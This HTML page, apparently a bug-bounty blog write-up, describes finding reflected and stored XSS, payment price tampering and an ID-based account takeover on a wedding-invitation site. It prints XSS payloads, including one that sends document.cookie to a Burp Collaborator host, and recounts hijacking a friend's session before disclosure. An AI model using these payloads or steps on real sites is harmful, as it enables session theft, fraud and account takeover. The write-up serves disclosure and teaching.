@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>From Wedding to Hacking - ryuukhagetsu@smileforyou</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Google Fonts - Roboto -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../assets/css/style.css">
+    <link rel="stylesheet" href="../../assets/css/cyber-animations.css">
+    <link rel="stylesheet" href="../../assets/css/blog-article.css">
+    <link rel="shortcut icon" href="../../assets/img/icon/favicon.ico" type="image/x-icon">
+</head>
+
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <img src="../../assets/img/logo/1692533172462_prev_ui.png" alt="ryuukhagetsu Logo" class="navbar-logo">
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+                <ul class="navbar-nav">
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#about">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#skills">Skills</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#projects">Projects</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/index.html#halloffame">Hall of Fame</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link active" href="index.html">Blog</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Article Header -->
+    <section class="article-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 mx-auto">
+                    <!-- Back to Articles Button -->
+                    <a href="index.html#blog" class="back-to-articles">
+                        <svg class="back-icon" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd"
+                                d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z"
+                                clip-rule="evenodd" />
+                        </svg>
+                        Back to Articles
+                    </a>
+                    <!-- Article Title -->
+                    <h1 class="article-title">From Wedding to <span class="highlight">Hacking</span>: Multiple
+                        Vulnerabilities</h1>
+
+                    <!-- Author Section - Single Row -->
+                    <div class="article-author-section">
+                        <div class="author-avatar">
+                            <img src="../../assets/img/logo/1692533172462_prev_ui.png" alt="ryuukhagetsu">
+                        </div>
+                        <div class="author-details">
+                            <h4>RyuuKhagetsu</h4>
+                            <div class="author-meta">
+                                <div class="publish-date">
+                                    <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM2 2a1 1 0 0 0-1 1v1h14V3a1 1 0 0 0-1-1H2zm13 3H1v9a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V5z" />
+                                    </svg>
+                                    Mar 15, 2024
+                                </div>
+                                <div class="read-time">
+                                    <svg width="12" height="12" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z" />
+                                        <path
+                                            d="m8.93 6.588-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588zM9 4.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" />
+                                    </svg>
+                                    12 min read
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Share Section with View on Medium -->
+                    <div class="article-share-section">
+                        <div class="share-left">
+                            <a href="https://medium.com/system-weakness/from-wedding-to-hacking-b8a92423eba"
+                                class="view-on-medium" target="_blank">
+                                <svg class="medium-icon" fill="currentColor" viewBox="0 0 16 16">
+                                    <path
+                                        d="M9.025 8c0 2.485-2.02 4.5-4.513 4.5A4.506 4.506 0 0 1 0 8c0-2.486 2.02-4.5 4.512-4.5A4.506 4.506 0 0 1 9.025 8zm4.95 0c0 2.34-1.01 4.236-2.256 4.236-1.246 0-2.256-1.897-2.256-4.236 0-2.34 1.01-4.236 2.256-4.236 1.246 0 2.256 1.897 2.256 4.236zM16 8c0 2.096-.355 3.795-.794 3.795-.438 0-.793-1.7-.793-3.795 0-2.096.355-3.795.794-3.795.438 0 .793 1.699.793 3.795z" />
+                                </svg>
+                                View on Medium
+                            </a>
+                        </div>
+                        <div class="share-right">
+                            <span class="share-label">Share:</span>
+                            <div class="share-buttons">
+                                <a href="#" class="share-btn share-twitter" data-share="twitter"
+                                    title="Share on Twitter">
+                                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" />
+                                    </svg>
+                                </a>
+                                <a href="#" class="share-btn share-linkedin" data-share="linkedin"
+                                    title="Share on LinkedIn">
+                                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z" />
+                                    </svg>
+                                </a>
+                                <a href="#" class="share-btn share-copy" data-share="copy" title="Copy Link">
+                                    <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
+                                        <path
+                                            d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z" />
+                                        <path
+                                            d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z" />
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Article Content -->
+    <section class="article-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-12">
+                    <!-- Formatted Article Content -->
+                    <div class="article-body">
+                        <p>Hello everyone, how are you all doing? I hope each and every one of you is doing well. In
+                            this article, it might be a bit longer than the previous ones.</p>
+
+                        <p>It all started when I was invited to attend my friend's wedding event through a website link.
+                            My friend used a website that provides online invitation creation for an event. I will be
+                            sharing several sections regarding the explanation of the bugs that I discovered:</p>
+
+                        <ul>
+                            <li><strong>XSS Reflected</strong></li>
+                            <li><strong>Change Price From Parameter Tampering</strong></li>
+                            <li><strong>Account Take Over</strong></li>
+                            <li><strong>XSS Stored</strong></li>
+                        </ul>
+
+                        <p>I hope you can easily find what you're looking for within this article, and for the website I
+                            mentioned above, we will refer to it as <strong>"site.com"</strong>.</p>
+
+                        <div class="article-image">
+                            <img src="https://images.unsplash.com/photo-1606800052052-a08af7148866?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80"
+                                alt="Wedding Invitation Website">
+                            <p class="image-caption">Wedding invitation website interface</p>
+                        </div>
+
+                        <h2>XSS Reflected</h2>
+                        <p>When I opened the invitation link sent by my friend, I received a URL
+                            <strong>www.site.com/my-friend-and-girl</strong> that contained the details of their wedding
+                            invitation.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/1.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>Then I started to wonder, could this invitation be customized for specific individuals, like
+                            the name "naruto," for example? Does this invitation allow for the inclusion of personally
+                            created names like that? I immediately opened my terminal and used the tool "arjun" to check
+                            if there were any other parameters present in that URL.</p>
+
+                        <div class="code-block">
+                            <code>arjun -u https://site.com/my-friend-and-girl</code>
+                        </div>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/2.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>After waiting for a while, I obtained the parameters <strong>"tap, rayId, to, rxk"</strong>
+                        </p>
+
+                        <p>I chose to use the "to" parameter, so the full URL became
+                            <strong>www.site.com/my-friend-and-girl?to=naruto</strong>. And to my surprise, the name
+                            "naruto" that I inputted appeared in the invitation.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/3.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>Then I used this payload:</p>
+
+                        <div class="code-block">
+                            <code">>&lt;img src=x onerror=alert(1)&gt;</code>
+                        </div>
+
+                        <p>And I successfully executed the pop-up alert.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/4.webp" alt="XSS Alert">
+                            <p class="image-caption">Successful XSS reflected attack execution</p>
+                        </div>
+
+                        <h2>Change Price From Parameter Tampering</h2>
+                        <p>After obtaining the XSS Reflected, I thought, why not take a little time to explore what the
+                            website has to offer. I arrived at the pricing page, which contained premium packages for
+                            users who wanted to access additional features. I attempted to purchase a premium account
+                            without the added features.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/5.webp" alt="Pricing Page">
+                            <p class="image-caption">Premium pricing page with multiple packages</p>
+                        </div>
+
+                        <p>I turned on Burp Suite and proceeded with the payment, and I got the request data like this.
+                        </p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/6.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using burp</p>
+                        </div>
+
+                        <p>I obtained the parameter <strong>"Price:124000"</strong> and immediately I changed it to
+                            <strong>"Price:10"</strong>. Then, I forwarded the request data.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/7.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter change using burp</p>
+                        </div>
+
+                        <p>Unfortunately, I didn't get what I was expecting, which was a change in the price.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/8.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>I tried going back to the previous page, and this time I attempted to add another feature to
+                            my purchase.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/9.webp" alt="Burp Suite Request">
+                            <p class="image-caption">Burp Suite intercepting payment request</p>
+                        </div>
+
+                        <p>I made sure that "intercept" was on in Burp Suite and proceeded with the payment. I obtained
+                            the following request data:</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/10.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>Because previously I had attempted to change the initial price but didn't succeed, this time
+                            I modified all the "Price" parameters under the "Items" section to "10".</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/11.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>I found that the price had changed to well below the actual price I was supposed to pay,
+                            which was <strong>"1,003,976"</strong>. It became <strong>"129,570"</strong>.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/12.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <div class="highlight-box">
+                            <p><strong>Critical Finding:</strong> Successfully manipulated the payment price through
+                                parameter tampering, reducing the total from 1,003,976 to 129,570 - a reduction of over
+                                87%</p>
+                        </div>
+
+                        <h2>Account Take Over</h2>
+                        <p>Hmm, interesting, I think. I returned to do a deeper recon on the user dashboard section. I
+                            created a user on the website and tried to look at the 'Edit Profile' section.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/13.webp" alt="User Dashboard">
+                            <p class="image-caption">User dashboard and profile edit section</p>
+                        </div>
+
+                        <p>I filled in the required data before pressing 'Update Profile.' I made sure my Burp Suite was
+                            running.</p>
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/14.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>When looking at the request, there are several interesting parameters, namely <strong>'id,
+                                is_admin, is_trial, is_reseller, is_premium, saldo, premium'</strong>. I tried changing
+                            all the parameters except the 'id' parameter, but unfortunately, none of them worked.</p>
+
+                        <p>I attempted to change <strong>'id: 165309 &lt;my first account&gt;'</strong> to <strong>'id:
+                                165310 &lt;my second account&gt;'</strong>, and it worked. The data on my second account
+                            changed to match the first account.</p>
+
+                        <div class="code-block">
+                            <code>
+                                // Original request<br>
+                                id: 165309<br>
+                                name: "My Account"<br>
+                                email: "myemail@test.com"<br>
+                                <br>
+                                // Modified request (Account Takeover)<br>
+                                id: 165310<br>
+                                name: "Victim Account"<br>
+                                email: "victim@test.com"
+                            </code>
+                        </div>
+
+                        <p>To take over an account, you can request a password reset link sent to the registered
+                            WhatsApp number.</p>
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/15.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>But when I returned to the dashboard, I realized there was a password form, so I filled it in
+                            immediately and received a data request as follows:</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/16.webp" alt="Parameter Discovery">
+                            <p class="image-caption">Parameter discovery using Arjun tool</p>
+                        </div>
+
+                        <p>I changed the 'id' parameter as I did above, and at this stage. I could access someone else's
+                            account without needing to request a password reset. It was as simple as creating a new
+                            password and changing the 'id' parameter.</p>
+
+                        <div class="highlight-box">
+                            <p><strong>Critical Vulnerability:</strong> Complete account takeover possible by simply
+                                manipulating the 'id' parameter in profile update requests. This allows changing
+                                passwords of any user account.</p>
+                        </div>
+
+                        <h2>XSS Stored</h2>
+                        <p>XSS Stored here I used to perform cookie stealing, leading to an account takeover. I found
+                            this bug when creating a free invitation on the website with same template like my friend.
+                            The invitation link is located at <strong>www.site.com/test-bug</strong></p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/17.webp" alt="Invitation Creation">
+                            <p class="image-caption">Creating a custom wedding invitation template</p>
+                        </div>
+
+                        <p>In the music section, you can customize it by adding SoundCloud, and I tried inputting a
+                            simple payload.</p>
+
+                        <div class="code-block">
+                            <code">&gt;&lt;h1&gt;lol&lt;/h1&gt;</code>
+                        </div>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/18.webp" alt="Invitation Creation">
+                            <p class="image-caption">Creating a custom wedding invitation template</p>
+                        </div>
+
+                        <p>And it was immediately rendered on the page. I began to wonder if this would be stored. I
+                            inserted an XSS payload.</p>
+
+                        <div class="code-block">
+                            <code">&gt;&lt;img src=x onerror=prompt(document.cookie)&gt;</code>
+                        </div>
+
+                        <p>I tried accessing my digital invitation and the XSS payload appeared perfectly.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/19.webp" alt="XSS Stored Execution">
+                            <p class="image-caption">Stored XSS successfully executing in the invitation</p>
+                        </div>
+
+                        <p>I used Burp Collaborator as a server to capture the cookie that would be taken. I used a
+                            simple payload like this.</p>
+
+                        <div class="code-block">
+                            <code">&gt;&lt;img src=x
+                                onerror=window.location.href='http://&lt;burp-collaborator&gt;/?cookie='+document.cookie&gt;</code>
+                        </div>
+
+                        <p>After that, I inserted it into the music form, and asked my friend to access the invitation.
+                            Hehe.</p>
+
+                        <p>In the Burp Collaborator, I received a response like the one below.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/20.webp" alt="Burp Collaborator">
+                            <p class="image-caption">Burp Collaborator capturing stolen cookies</p>
+                        </div>
+
+                        <p>I immediately changed all the cookies in the browser to match the cookie I obtained.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/21.webp" alt="Invitation Creation">
+                            <p class="image-caption">Creating a custom wedding invitation template</p>
+                        </div>
+
+                        <p>I refreshed my browser, and I successfully gained access to my friend's account.</p>
+
+                        <div class="article-image">
+                            <img src="../assets/img/blog/from_wedding_to_hacking/22.webp" alt="Invitation Creation">
+                            <p class="image-caption">Creating a custom wedding invitation template</p>
+                        </div>
+
+                        <div class="highlight-box">
+                            <p><strong>Successful Cookie Theft:</strong> Through stored XSS, I was able to steal session
+                                cookies and gain unauthorized access to victim accounts without their knowledge.</p>
+                        </div>
+
+                        <h2>Responsible Disclosure and Resolution</h2>
+                        <p>I reported it, and unexpectedly, I received a reward for my report. I have requested
+                            permission to write this article, and they have granted it.</p>
+
+                        <div class="highlight-box">
+                            <p><strong>Note:</strong> I've obtained permission, but they mentioned using the inspect
+                                element and modifying the data as needed because they didn't want any accidental
+                                publication of sensitive user data and their data. However, the way I found the bug is
+                                as I reported, but they asked me to use the latest screenshot after they patched their
+                                system.</p>
+                        </div>
+
+                        <h2>Impact Summary</h2>
+                        <p>The vulnerabilities discovered had significant security implications:</p>
+
+                        <ul>
+                            <li><strong>XSS Reflected:</strong> Allowed for client-side attacks and potential session
+                                hijacking</li>
+                            <li><strong>Price Manipulation:</strong> Financial impact with ability to purchase premium
+                                features at drastically reduced prices</li>
+                            <li><strong>Account Takeover:</strong> Complete compromise of user accounts through
+                                parameter manipulation</li>
+                            <li><strong>XSS Stored:</strong> Persistent attacks affecting all users who view the
+                                malicious invitation</li>
+                        </ul>
+
+                        <h2>Conclusion</h2>
+                        <p>This case demonstrates how a simple wedding invitation website can harbor multiple critical
+                            vulnerabilities. The combination of inadequate input validation, improper access controls,
+                            and insufficient parameter verification created a perfect storm for security exploitation.
+                        </p>
+
+                        <p>Maybe that's all from me, hopefully it can be a reference for you. I'm RyuuKhagetsu, see you
+                            in next article.</p>
+
+                        <!-- Tags Section -->
+                        <div class="article-tags">
+                            <h4>Tags:</h4>
+                            <div class="tags-list">
+                                <span class="tag">#BugBounty</span>
+                                <span class="tag">#XSS</span>
+                                <span class="tag">#ParameterTampering</span>
+                                <span class="tag">#AccountTakeover</span>
+                                <span class="tag">#WebSecurity</span>
+                                <span class="tag">#EthicalHacking</span>
+                                <span class="tag">#StoredXSS</span>
+                                <span class="tag">#Cybersecurity</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- Related Articles -->
+    <section class="related-articles">
+        <div class="container">
+            <div class="row mb-5">
+                <div class="col-12 text-center">
+                    <h2>Related <span class="highlight">Articles</span></h2>
+                    <p class="mt-3 opacity-75">Explore more cybersecurity insights and techniques</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-6 mb-4">
+                    <div class="article-card-horizontal">
+                        <div class="article-image">
+                            <img src="../assets/img/content/1.jpeg">
+                            <div class="article-overlay">
+                                <a href="how-do-i-get-root-on-linux.html" class="article-link">read article</a>
+                            </div>
+                        </div>
+                        <div class="related-content">
+                            <div class="article-tags">
+                                <span class="article-tag">Penetration Testing</span>
+                                <span class="article-tag">Linux Security</span>
+                            </div>
+                            <h3 class="related-title">
+                                <a href="wedding-to-hacking.html">From Wedding to Hacking</a>
+                            </h3>
+                            <p class="article-excerpt">
+                                Hi all! How are you guys? I hope everything is fine. This time, I want to share my
+                                experience in getting root access on a Linux server...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-6 mb-4">
+                    <div class="article-card-horizontal">
+                        <div class="article-image">
+                            <img src="../assets/img/content/1.jpeg">
+                            <div class="article-overlay">
+                                <a href="how-do-i-get-root-on-linux.html" class="article-link">read article</a>
+                            </div>
+                        </div>
+                        <div class="related-content">
+                            <div class="article-tags">
+                                <span class="article-tag">Penetration Testing</span>
+                                <span class="article-tag">Linux Security</span>
+                            </div>
+                            <h3 class="related-title">
+                                <a href="wedding-to-hacking.html">From Wedding to Hacking</a>
+                            </h3>
+                            <p class="article-excerpt">
+                                Hi all! How are you guys? I hope everything is fine. This time, I want to share my
+                                experience in getting root access on a Linux server...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <div class="container">
+
+
+            <div class="footer-content">
+                <div class="footer-logo">
+                    <h3>ryuukhagetsu<span class="highlight">@smileforyou</span></h3>
+                    <p class="footer-tagline">Ethical Hacker | Security Researcher | Bug Hunter | Mahasiswa Biasa
+                    </p>
+                    <p class="section-subtitle">Have a project or security concern? Let's work together</p>
+                </div>
+                <div class="social-links">
+                    <a href="#" class="social-link" title="LinkedIn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="Instagram">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="Medium">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M9.025 8c0 2.485-2.02 4.5-4.513 4.5A4.506 4.506 0 0 1 0 8c0-2.486 2.02-4.5 4.512-4.5A4.506 4.506 0 0 1 9.025 8zm4.95 0c0 2.34-1.01 4.236-2.256 4.236-1.246 0-2.256-1.897-2.256-4.236 0-2.34 1.01-4.236 2.256-4.236 1.246 0 2.256 1.897 2.256 4.236zM16 8c0 2.096-.355 3.795-.794 3.795-.438 0-.793-1.7-.793-3.795 0-2.096.355-3.795.794-3.795.438 0 .793 1.699.793 3.795z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="Twitter">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" />
+                        </svg>
+                    </a>
+                    <a href="#" class="social-link" title="GitHub">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="currentColor"
+                            viewBox="0 0 16 16">
+                            <path
+                                d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" />
+                        </svg>
+                    </a>
+                </div>
+                <div class="footer-text">
+                    <p class="security-note">Made With <span class="heart-icon">&hearts;</span> by RyuuKhagetsu</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../../assets/js/script.js"></script>
+    <script src="../../assets/js/cyber-animations.js"></script>
+
+</body>
+
+</html>
